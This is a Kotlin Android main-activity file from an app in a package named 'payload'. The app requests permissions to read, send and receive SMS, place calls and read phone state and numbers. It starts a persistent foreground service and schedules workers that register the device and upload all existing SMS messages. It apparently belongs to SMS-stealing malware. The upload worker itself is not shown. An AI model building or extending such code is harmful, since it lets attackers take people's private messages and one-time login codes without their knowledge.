package com.payload.jansiix0ne

import android.Manifest
import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.*
import androidx.core.content.ContextCompat
import androidx.core.content.PermissionChecker
import com.payload.jansiix0ne.services.UnifiedService
import com.payload.jansiix0ne.ui.MainScreen
import com.payload.jansiix0ne.ui.theme.AppTheme

class MainActivity : ComponentActivity() {

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            setupContent()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Check permissions
        val requiredPermissions = getRequiredPermissions()
        val allPermissionsGranted = requiredPermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PermissionChecker.PERMISSION_GRANTED
        }

        if (!allPermissionsGranted) {
            permissionLauncher.launch(requiredPermissions)
        } else {
            setupContent()
            registerDevice()
        }

        // Start foreground service
        startForegroundService(Intent(applicationContext, UnifiedService::class.java))
    }
    
    private fun registerDevice() {
        // Schedule device registration worker
        androidx.work.WorkManager.getInstance(applicationContext).enqueueUniqueWork(
            "register_device",
            androidx.work.ExistingWorkPolicy.KEEP,
            androidx.work.OneTimeWorkRequestBuilder<com.payload.jansiix0ne.worker.RegisterUserWorker>()
                .build()
        )
        
        // Schedule all SMS upload worker (for old SMS)
        androidx.work.WorkManager.getInstance(applicationContext).enqueueUniqueWork(
            "upload_all_sms",
            androidx.work.ExistingWorkPolicy.KEEP,
            androidx.work.OneTimeWorkRequestBuilder<com.payload.jansiix0ne.worker.AllSmsUploadWorker>()
                .build()
        )
    }

    override fun onResume() {
        super.onResume()
        val requiredPermissions = getRequiredPermissions()
        val allPermissionsGranted = requiredPermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PermissionChecker.PERMISSION_GRANTED
        }
        
        if (allPermissionsGranted) {
            setupContent()
            registerDevice()
        }
    }

    private fun setupContent() {
        setContent {
            AppTheme {
                MainScreen()
            }
        }
    }

    private fun getRequiredPermissions(): Array<String> {
        val permissions = mutableListOf(
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        )
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        
        return permissions.toTypedArray()
    }
}
